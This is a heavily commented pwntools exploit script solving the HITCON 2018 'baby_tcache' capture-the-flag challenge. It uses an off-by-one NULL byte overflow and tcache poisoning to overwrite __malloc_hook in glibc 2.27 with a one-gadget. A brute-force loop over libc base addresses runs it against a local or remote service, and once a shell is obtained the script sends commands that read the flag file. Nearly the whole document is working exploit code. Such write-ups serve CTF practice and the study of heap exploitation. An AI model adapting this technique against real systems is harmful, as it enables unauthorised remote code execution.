#!/usr/bin/env python2
# -*- coding: utf-8 -*-
import os

from pwn import *

context(arch="amd64", os="linux")

# by integeruser and comewel

# TL;DR tcache poisoning to allocate chunks at arbitrary addresses, and overwrite `__malloc_hook`
# with the address of a one-gadget; since it seems we cannot leak any data, we need to bruteforce
# 12 bits of libc addresses!

# note: this exploit doesn't work so well in remote because of `read()` sometimes terminating
# before receiving the full content of the biggest chunks we try to allocate; to make the exploit
# more reliable in remote, just decrease the size of the chunks we use here (of course, some calculations
# are required to maintain the same heap layout)

# EDIT: apparently, the intended solution (https://github.com/scwuaptx/CTF/blob/master/2018-writeup/hitcon/baby_tcache.py)
# is a little smarter: props!


def exploit():
    # in this exploit, we indicate with `tcache->entries[1]` the tcache bin containing
    # the chunks of size 0x20 (or 0x30 considering also the fields `mchunk_prev_size` and `mchunk_size`)

    # allocate four chunks A, X, B, C
    A = fit(filler="A", length=0x608)
    new_heap(A)

    X = fit(filler="X", length=0x20)
    new_heap(X)

    B = fit(filler="B", length=0x1808)
    new_heap(B)

    C = fit(filler="C", length=0x4F0)
    new_heap(C)

    # gef➤  heap chunks
    # Chunk(addr=0x555555759010, size=0x250, flags=PREV_INUSE)
    #     [0x0000555555759010     00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00     ................]
    # Chunk(addr=0x555555759260, size=0x610, flags=PREV_INUSE)
    #     [0x0000555555759260     41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41     AAAAAAAAAAAAAAAA]
    # Chunk(addr=0x555555759870, size=0x30, flags=PREV_INUSE)
    #     [0x0000555555759870     58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58     XXXXXXXXXXXXXXXX]
    # Chunk(addr=0x5555557598a0, size=0x1810, flags=PREV_INUSE)
    #     [0x00005555557598a0     42 42 42 42 42 42 42 42 42 42 42 42 42 42 42 42     BBBBBBBBBBBBBBBB]
    # Chunk(addr=0x55555575b0b0, size=0x500, flags=PREV_INUSE)
    #     [0x000055555575b0b0     43 43 43 43 43 43 43 43 43 43 43 43 43 43 43 43     CCCCCCCCCCCCCCCC]
    # Chunk(addr=0x55555575b5b0, size=0x1e900, flags=PREV_INUSE)  ←  top chunk

    # allocate chunks T1 and T2 of size 0x20 (the why is explained later)
    T1 = fit(filler="T1", length=0x20)
    new_heap(T1)

    T2 = fit(filler="T2", length=0x20)
    new_heap(T2)

    # allocate chunk T3 of size 0x20...
    T3 = fit(filler="T3", length=0x20)
    new_heap(T3)
    # ...and free it, so that it is put in `tcache->entries[1]`
    delete_heap(6)
    # now `tcache->entries[1]` contains the address of T3, whose `next` pointer is set to NULL,
    # i.e. `tcache->entries[1] = T3 -> NULL`

    # free chunk X (of size 0x20), which is also put in `tcache->entries[1]`
    delete_heap(1)
    # now `tcache->entries[1] = X -> T3 -> NULL`

    # free chunk B...
    delete_heap(2)
    # ...and promptly reallocate it (as B1), to override the least significative byte of
    # the `mchunk_size` field of chunk C with \0 (off-by-one NULL byte overflow)
    C_prev_size = 0x610 + 0x30 + 0x1810
    B1 = fit({0x1800: C_prev_size}, filler="B1", length=0x1808)
    new_heap(B1)
    # chunk B1 lies exactly in between chunks X and C (as chunk B did before)

    # having altered the `mchunk_size` field of C, chunk B1 is seen as not-in-use (even though it is); thus,
    # the last 8 bytes of B1 (which we control) are interpreted as the `mchunk_prev_size` field of C

    # here, we have set the `mchunk_prev_size` of C so that, instead of pointing to the start of
    # chunk B (as it should), it points to the start of chunk A

    # we now free chunk C with corrupted `mchunk_prev_size`, coalescing the whole block of heap from
    # chunk A to the end of C with the top chunk
    # (before freeing C, we free A so to pass the check `corrupted size vs. mchunk_prev_size`)
    delete_heap(0)
    delete_heap(3)
    # being between chunks A and C, chunk X was also merged into the top chunk; but
    # the address of X is still in `tcache->entries[1]`

    # allocate chunk L (for padding)...
    L = fit(filler="L", length=0x600)
    new_heap(L)
    # ...and allocate M, which is assigned the same address that X had!
    M = fit(filler="M", length=0x1000)
    new_heap(M)

    # now, free M so that it goes in the unsorted bin and populates its `fd` and `bk` fields
    # with addresses from libc (i.e. the address of the unsorted bin)
    delete_heap(2)
    # since M and X have the same address, the `next` pointer of X (coincident with the `fd` field of M)
    # is also overwritten with the address of the unsorted bin
    # now `tcache->entries[1] = X (== M) -> UNSORTED_BIN_ADDR -> ???`

    # if we allocate two chunks of size 0x20, these will be pulled from `tcache->entries[1]`,
    # and the second chunk will start exactly at `UNSORTED_BIN_ADDR`

    # our end goal is to write into `__malloc_hook` the address of a one-gadget
    # to do so, we need to:
    # 1) make malloc returning the address of `__malloc_hook`-0x10, so to write 0x31 at `__malloc_hook`-0x10
    #    and create a fake chunk of size 0x20 starting at `__malloc_hook`
    # 2) make malloc returning the address of `__malloc_hook`, and save the pointer
    # 3) put at the top of the `tcache->entries[1]` bin the address of a one-gadget
    # 4) free the `__malloc_hook` chunk, which goes into `tcache->entries[1]` and `__malloc_hook` is
    #    updated with the address of the one-gadget (which was at the top of `tcache->entries[1]`)
    # 5) call `malloc()` to trigger the execution of `__malloc_hook()`

    # we now continue the exploit proceeding with step 1)

    # we reallocate M as M1, specifying a size of 0x1000 but providing only 3 bytes of data
    # (the 3 least significative bytes of the address of `__malloc_hook`-0x10)
    M1 = p32(__malloc_hook_addr - 0x10 & 0xFFFFFF)[:-1]
    new_heap(M1, size=0x1000)
    # since, once again, M1 overlaps with X, with this reallocation we changed the lowest 3 bytes of
    # the `next` pointer of X (which was `UNSORTED_BIN_ADDR` and is now the address of `__malloc_hook`-0x10)

    # as said a few lines above, we malloc a chunk of size 0x20 to first pull X from `tcache->entries[1]`...
    Z = fit(filler="Z", length=0x20)
    new_heap(Z)
    # ...and then a second chunk of size 0x20 to pull our chosen address of libc...
    W = "AAAABBBB" + p64(0x31)
    new_heap(W, size=0x20)
    # ...which we used to set the `mchunk_size` field of the (imaginary) chunk starting at `__malloc_hook`
    # to 0x31 (i.e. 0x20 (chunk data) + 0x10 (chunk headers) + 0x1 (PREV_INUSE bit))

    # since we artificially added an entry in `tcache->entries[1]` by modifying a `next` pointer
    # from NULL to `__malloc_hook`-0x10, the two consecutive allocations of chunks Z and W (both of size 0x20)
    # had the side effect of setting `tcache->counts[1]` to -1, invalidating the possibility
    # of using `tcache->entries[1]` anymore

    # so, before moving on, we restore `tcache->counts[1]` to a positive number by freeing chunks T1 and T2
    # (i.e. putting them into `tcache->entries[1]`), allocated at the start of the exploit for this exact reason
    delete_heap(4)
    delete_heap(5)

    # ######################################################################## #

    # now, we repeat the exact same process as above to make malloc returning exactly
    # the address of `__malloc_hook`, completing step 2)

    A = fit(filler="A", length=0xD20)
    new_heap(A)

    X = fit(filler="X", length=0x20)
    new_heap(X)

    B = fit(filler="B", length=0x1808)
    new_heap(B)

    C = fit(filler="C", length=0x4F0)
    new_heap(C)

    # gef➤  heap chunks
    # Chunk(addr=0x555555759010, size=0x250, flags=PREV_INUSE)
    #     [0x0000555555759010     00 01 00 00 00 00 00 00 00 00 00 00 00 00 00 00     ................]
    # Chunk(addr=0x555555759260, size=0x610, flags=PREV_INUSE)
    #     [0x0000555555759260     4c 4c 4c 4c 4c 4c 4c 4c 4c 4c 4c 4c 4c 4c 4c 4c     LLLLLLLLLLLLLLLL]
    # Chunk(addr=0x555555759870, size=0x1010, flags=PREV_INUSE)
    #     [0x0000555555759870     5a 5a 5a 5a 5a 5a 5a 5a 5a 5a 5a 5a 5a 5a 5a 5a     ZZZZZZZZZZZZZZZZ]
    # Chunk(addr=0x55555575a880, size=0xd30, flags=PREV_INUSE)
    #     [0x000055555575a880     41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41     AAAAAAAAAAAAAAAA]
    # Chunk(addr=0x55555575b5b0, size=0x30, flags=PREV_INUSE)
    #     [0x000055555575b5b0     10 b4 a7 f7 ff 7f 00 00 da da da da da da da da     ................]
    # Chunk(addr=0x55555575b5e0, size=0x30, flags=PREV_INUSE)
    #     [0x000055555575b5e0     58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58     XXXXXXXXXXXXXXXX]
    # Chunk(addr=0x55555575b610, size=0x30, flags=PREV_INUSE)
    #     [0x000055555575b610     00 00 00 00 00 00 00 00 da da da da da da da da     ................]
    # Chunk(addr=0x55555575b640, size=0x1810, flags=PREV_INUSE)
    #     [0x000055555575b640     42 42 42 42 42 42 42 42 42 42 42 42 42 42 42 42     BBBBBBBBBBBBBBBB]
    # Chunk(addr=0x55555575ce50, size=0x500, flags=PREV_INUSE)
    #     [0x000055555575ce50     43 43 43 43 43 43 43 43 43 43 43 43 43 43 43 43     CCCCCCCCCCCCCCCC]
    # Chunk(addr=0x55555575d350, size=0x1cb00, flags=PREV_INUSE)  ←  top chunk

    # free chunk X which goes in `tcache->entries[1]`
    delete_heap(5)

    # free chunk B...
    delete_heap(7)
    # ...and promptly reallocate it (as B1), to override the least significative byte of
    # the `mchunk_size` field of chunk C with \0 (off-by-one NULL byte overflow)
    C_prev_size = 0xD30 + 0x30 + 0x30 + 0x30 + 0x1810
    B1 = fit({0x1800: C_prev_size}, filler="B1", length=0x1808)
    new_heap(B1)
    # chunk B1 lies exactly in between chunks X and C (as chunk B did before)

    # as explained before, free chunk A and in turn C...
    delete_heap(4)
    delete_heap(8)
    # ...so to merge back X into the top chunk; but X is also in `tcache->entries[1]`

    # allocate chunk L (for padding)...
    L = fit(filler="L", length=0xD30 - 0x10 + 0x30)
    new_heap(L)
    # ...and allocate M, which is assigned the same address that X had!
    M = fit(filler="M", length=0x1000)
    new_heap(M)

    # allocate any chunk after M, so that when we free M it doesn't coalesce with the top chunk
    Z = fit(filler="Z", length=0x1000)
    new_heap(Z)

    # now, free M so that it goes in the unsorted bin and populates its `fd` and `bk` fields
    # with the address of the unsorted bin
    delete_heap(7)

    # reallocate M as M1, specifying a size of 0x1000 but providing only 3 bytes of data
    # (the 3 least significative bytes of the address of `__malloc_hook`)
    M1 = p32(__malloc_hook_addr & 0xFFFFFF)[:-1]
    new_heap(M1, size=0x1000)
    # since M1 overlaps with X, with this reallocation we changed the lowest 3 bytes of
    # the `next` pointer of X (which was `UNSORTED_BIN_ADDR` and is now the address of `__malloc_hook`)

    # as explained before, we malloc a chunk of size 0x20 to first pull X from `tcache->entries[1]`...
    Z = fit(filler="Z", length=0x20)
    new_heap(Z)

    # (free chunks we don't use anymore, since the binary allows to use
    # at maximum 10 "heaps" (as it calls them) at a time)
    delete_heap(0)

    # ...and then a second chunk of size 0x20 to pull our chosen address of libc...
    W = "\0"
    new_heap(W, size=0x20)
    # ...in which we write \0 (so not to trigger any involuntary calls to `__malloc_hook`)

    # we now have a pointer to `__malloc_hook`

    # (free chunks we don't use anymore, since the binary allows to use
    # at maximum 10 "heaps" (as it calls them) at a time)
    delete_heap(2)
    delete_heap(4)
    delete_heap(7)
    delete_heap(8)

    # ######################################################################## #

    # now, we repeat the exact same process as above to put the address of a one-gadget
    # at the top of the `tcache->entries[1]` bin, completing step 3)

    A = fit(filler="A", length=0xD20)
    new_heap(A)

    X = fit(filler="X", length=0x20)
    new_heap(X)

    B = fit(filler="B", length=0x1808)
    new_heap(B)

    C = fit(filler="C", length=0x4F0)
    new_heap(C)

    # gef➤  heap chunks
    # Chunk(addr=0x555555759010, size=0x250, flags=PREV_INUSE)
    #     [0x0000555555759010     00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00     ................]
    # Chunk(addr=0x555555759260, size=0xd30, flags=PREV_INUSE)
    #     [0x0000555555759260     41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41     AAAAAAAAAAAAAAAA]
    # Chunk(addr=0x555555759f90, size=0x30, flags=PREV_INUSE)
    #     [0x0000555555759f90     58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58     XXXXXXXXXXXXXXXX]
    # Chunk(addr=0x555555759fc0, size=0x1810, flags=PREV_INUSE)
    #     [0x0000555555759fc0     42 42 42 42 42 42 42 42 42 42 42 42 42 42 42 42     BBBBBBBBBBBBBBBB]
    # Chunk(addr=0x55555575b7d0, size=0x500, flags=PREV_INUSE)
    #     [0x000055555575b7d0     43 43 43 43 43 43 43 43 43 43 43 43 43 43 43 43     CCCCCCCCCCCCCCCC]
    # Chunk(addr=0x55555575bcd0, size=0x1e100, flags=PREV_INUSE)  ←  top chunk

    # free chunk X which goes in `tcache->entries[1]`
    delete_heap(4)

    # free chunk B...
    delete_heap(7)
    # ...and promptly reallocate it (as B1), to override the least significative byte of
    # the `mchunk_size` field of chunk C with \0 (off-by-one NULL byte overflow)
    C_prev_size = 0xD30 + 0x30 + 0x1810
    B1 = fit({0x1800: C_prev_size}, filler="B1", length=0x1808)
    new_heap(B1)
    # chunk B1 lies exactly in between chunks X and C (as chunk B did before)

    # as explained before, free chunk A and in turn C...
    delete_heap(2)
    delete_heap(8)
    # ...so to merge back X into the top chunk; but X is also in `tcache->entries[1]`

    # allocate chunk L (for padding)...
    L = fit(filler="L", length=0xD30 - 0x10)
    new_heap(L)
    # ...and allocate M, which is assigned the same address that X had!
    M = fit(filler="M", length=0x1000)
    new_heap(M)

    # allocate any chunk after M, so that when we free M it doesn't coalesce with the top chunk
    Z = fit(filler="Z", length=0x1000)
    new_heap(Z)

    # now, free M so that it goes in the unsorted bin and populates its `fd` and `bk` fields
    # with the address of the unsorted bin
    delete_heap(7)

    # reallocate M as M1, specifying a size of 0x1000 but providing only 3 bytes of data
    # (the 3 least significative bytes of the address of the one gadget)
    M1 = p32(one_gadget_addr & 0xFFFFFF)[:-1]
    new_heap(M1, size=0x1000)
    # since M1 overlaps with X, with this reallocation we changed the lowest 3 bytes of
    # the `next` pointer of X (which was `UNSORTED_BIN_ADDR` and now is the address of the one-gadget)

    # (free chunks we don't use anymore, since the binary allows to use
    # at maximum 10 "heaps" (as it calls them) at a time)
    delete_heap(8)

    # as explained before, we malloc a chunk of size 0x20 to pull X from `tcache->entries[1]`...
    Z = fit(filler="Z", length=0x20)
    new_heap(Z)
    # ...and now `tcache->entries[1] = ONE_GADGET_ADDR -> ???`

    # ######################################################################## #

    # we free the `__mallok_hook` chunk, completing step 4)
    delete_heap(0)
    # now the address of the one-gadget is written at the address of `__malloc_hook`

    # in step 5), we malloc any chunk to trigger `__malloc_hook()`...
    io.sendlineafter("Your choice: ", "1")
    io.sendlineafter("Size:", "123")

    # ...and the shell pops!


def new_heap(data, size=None):
    out = io.recvuntil("Your choice: ")
    if "Invalid" in out:
        # remote didn't receive data correctly, quit early
        raise EOFError
    io.sendline("1")

    out = io.recvuntil("Size:")
    if "Invalid" in out:
        # remote didn't receive data correctly, quit early
        raise EOFError
    if not size:
        io.sendline(str(len(data)))
    else:
        io.sendline(str(size))

    out = io.recvuntil("Data:")
    if "Invalid" in out:
        # remote didn't receive data correctly, quit early
        raise EOFError
    io.send(data)


def delete_heap(index):
    out = io.recvuntil("Your choice: ")
    if "Invalid" in out:
        # remote didn't receive data correctly, quit early
        raise EOFError
    io.sendline("2")

    out = io.recvuntil("Index:")
    if "Invalid" in out:
        # remote didn't receive data correctly, quit early
        raise EOFError
    io.sendline(str(index))


binary = ELF("./baby_tcache-2.27-3ubuntu1")  # https://github.com/integeruser/bowkin
libc = ELF("libs/libc-amd64-2.27-3ubuntu1.so")

# as said above, we need some bruteforcing
with context.quiet:
    i = 0
    while True:
        i += 1
        print(i)

        try:
            if not args["REMOTE"]:
                argv = [binary.path]
                envp = {"PWD": os.getcwd()}

                if args["GDB"]:
                    io = gdb.debug(
                        args=argv,
                        env=envp,
                        aslr=False,
                        terminal=["tmux", "new-window"],
                        gdbscript="""
                            set breakpoint pending on
                            set follow-fork-mode parent

                            baseaddr
                            set $chunks = $baseaddr+0x202060

                            continue
                        """,
                    )
                else:
                    io = process(argv=argv, env=envp)
            else:
                io = remote("192.168.56.64", 12345)
                # io = remote("52.68.236.186", 56746)

            if args["GDB"]:
                libc_address = 0x7FFFF79E4000
            else:
                libc_address = (
                    0x7F6A5C9E2000
                )  # one of the many possible base addresses of libc, taken from GDB
                # we need to re-execute this exploit until the remote program
                # uses this address as base address of libc

            __malloc_hook_addr = libc_address + 0x3EBC30

            # $ one_gadget libc.so.6
            # . . .
            # 0x10a38c        execve("/bin/sh", rsp+0x70, environ)
            # constraints:
            #   [rsp+0x70] == NULL
            one_gadget_addr = libc_address + 0x10A38C

            exploit()

            if args["GDB"]:
                io.interactive()
                break  # stop bruteforce
            else:
                out = io.recv(200, timeout=2)
                if "Data:" in out:
                    # something went wrong
                    raise EOFError
                # otherwise, we should have a shell
                sleep(0.5)
                io.sendline("ls")
                sleep(0.5)
                io.sendline("ls /home/")
                sleep(0.5)
                io.sendline("ls /home/baby_tcache/")
                sleep(0.5)
                io.sendline("cat /home/baby_tcache/fl4g.txt")
                sleep(0.5)
                io.interactive()
                break  # stop bruteforce
        except EOFError:
            io.close()
# hitcon{He4p_ch41leng3s_4r3_n3v3r_d34d_XD}
